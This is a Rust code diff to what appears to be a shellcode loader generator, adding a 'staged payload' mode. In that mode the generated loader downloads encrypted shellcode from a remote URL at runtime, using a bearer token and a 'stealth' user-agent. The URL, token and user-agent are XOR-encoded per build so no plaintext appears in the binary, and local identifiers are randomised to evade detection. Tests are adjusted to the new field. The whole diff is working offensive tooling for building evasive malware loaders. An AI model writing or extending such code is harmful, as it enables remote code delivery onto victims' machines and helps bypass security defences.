@@ -124,6 +124,16 @@ pub struct WsfStubConfig {
     pub type_name: String,
 }
 
+/// Staged-payload delivery configuration. When set, the generated loader
+/// fetches the shellcode from `url` at runtime with `Authorization: Bearer jwt`
+/// and a stealth `User-Agent: user_agent`, instead of embedding it inline.
+#[derive(Debug, Clone, Serialize)]
+pub struct StagedConfig {
+    pub url:        String,
+    pub jwt:        String,
+    pub user_agent: String,
+}
+
 #[derive(Debug, Clone, Serialize)]
 pub struct LoaderConfig {
     pub loader_type: LoaderType,
@@ -136,6 +146,7 @@ pub struct LoaderConfig {
     pub appdomain_config: Option<AppDomainConfig>,
     pub wsf_stub_config: Option<WsfStubConfig>,
     pub dotnet_stub_hex: Option<String>,
+    pub staged: Option<StagedConfig>,
 }
 
 #[derive(Debug, Clone, Serialize)]
@@ -576,6 +587,50 @@ fn build_context(config: &LoaderConfig) -> Context {
     ctx.insert("jsc_vbox_reg_enc",   &jsc_vbox_enc);
     ctx.insert("jsc_vbox_reg_xk",    &(wsf_vbx_xk as u32));
 
+    // ── Staged-delivery context ──────────────────────────────────────────────
+    // When `config.staged` is Some, the loader must fetch the encrypted shellcode
+    // from `url` at runtime with `Authorization: Bearer <jwt>` and a stealth
+    // user-agent. URL/JWT/UA are XOR-encoded per build (no plaintext in binary).
+    let is_staged = config.staged.is_some();
+    ctx.insert("is_staged", &is_staged);
+    if let Some(st) = &config.staged {
+        let url_xk:  u8 = rng.gen();
+        let jwt_xk:  u8 = rng.gen();
+        let ua_xk:   u8 = rng.gen();
+        let url_b   = st.url.as_bytes();
+        let jwt_b   = st.jwt.as_bytes();
+        let ua_b    = st.user_agent.as_bytes();
+        // Rust (u32 vec form)
+        let url_enc_rust: Vec<u32> = url_b.iter().map(|&b| (b ^ url_xk) as u32).collect();
+        let jwt_enc_rust: Vec<u32> = jwt_b.iter().map(|&b| (b ^ jwt_xk) as u32).collect();
+        let ua_enc_rust:  Vec<u32> = ua_b.iter().map(|&b| (b ^ ua_xk)  as u32).collect();
+        ctx.insert("staged_url_enc",  &url_enc_rust);
+        ctx.insert("staged_url_xk",   &(url_xk as u32));
+        ctx.insert("staged_url_len",  &(url_b.len() as u32));
+        ctx.insert("staged_jwt_enc",  &jwt_enc_rust);
+        ctx.insert("staged_jwt_xk",   &(jwt_xk as u32));
+        ctx.insert("staged_jwt_len",  &(jwt_b.len() as u32));
+        ctx.insert("staged_ua_enc",   &ua_enc_rust);
+        ctx.insert("staged_ua_xk",    &(ua_xk as u32));
+        ctx.insert("staged_ua_len",   &(ua_b.len() as u32));
+        // Comma-joined form for JScript/C# initialisers
+        let to_csv = |v: &[u32]| v.iter().map(|n| n.to_string()).collect::<Vec<_>>().join(",");
+        ctx.insert("staged_url_csv", &to_csv(&url_enc_rust));
+        ctx.insert("staged_jwt_csv", &to_csv(&jwt_enc_rust));
+        ctx.insert("staged_ua_csv",  &to_csv(&ua_enc_rust));
+        // Per-build identifiers for fetch helper + local vars
+        let mut sv: HashMap<String, String> = HashMap::new();
+        for k in &[
+            "fn_fetch",
+            "sg_lv_url", "sg_lv_jwt", "sg_lv_ua", "sg_lv_i",
+            "sg_lv_req", "sg_lv_buf", "sg_lv_resp",
+            "sg_lv_h", "sg_lv_session", "sg_lv_conn", "sg_lv_h2",
+        ] {
+            sv.insert(k.to_string(), rand_ident(8));
+        }
+        ctx.insert("sg", &sv);
+    }
+
     ctx
 }
 
@@ -664,6 +719,7 @@ mod tests {
             appdomain_config: None,
             wsf_stub_config: None,
             dotnet_stub_hex: None,
+        staged: None,
         };
         let result = generate_loader_source(&config).unwrap();
         assert!(!result.contains("let shellcode "));
@@ -698,6 +754,7 @@ mod tests {
             appdomain_config: None,
             wsf_stub_config: None,
             dotnet_stub_hex: None,
+        staged: None,
         };
         let source = generate_loader_source(&config).unwrap();
         assert!(source.contains("DllMain"));
